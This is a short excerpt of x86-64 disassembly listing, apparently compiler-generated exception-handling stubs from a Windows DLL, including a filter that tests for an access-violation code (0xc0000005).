   18000e1cd:	48 83 c4 20          	add    $0x20,%rsp
   18000e1d1:	5d                   	pop    %rbp
   18000e1d2:	e9 95 87 ff ff       	jmp    0x18000696c
   18000e1d7:	cc                   	int3
   18000e1d8:	40 55                	rex push %rbp
   18000e1da:	48 83 ec 30          	sub    $0x30,%rsp
   18000e1de:	48 8b ea             	mov    %rdx,%rbp
   18000e1e1:	48 8b 4d 40          	mov    0x40(%rbp),%rcx
   18000e1e5:	48 83 c4 30          	add    $0x30,%rsp
   18000e1e9:	5d                   	pop    %rbp
   18000e1ea:	e9 e9 b5 ff ff       	jmp    0x1800097d8
   18000e1ef:	cc                   	int3
   18000e1f0:	40 55                	rex push %rbp
   18000e1f2:	48 83 ec 20          	sub    $0x20,%rsp
   18000e1f6:	48 8b ea             	mov    %rdx,%rbp
   18000e1f9:	48 8b 01             	mov    (%rcx),%rax
   18000e1fc:	33 c9                	xor    %ecx,%ecx
   18000e1fe:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   18000e204:	0f 94 c1             	sete   %cl
   18000e207:	8b c1                	mov    %ecx,%eax
   18000e209:	48 83 c4 20          	add    $0x20,%rsp
   18000e20d:	5d                   	pop    %rbp
   18000e20e:	c3                   	ret
   18000e20f:	cc                   	int3
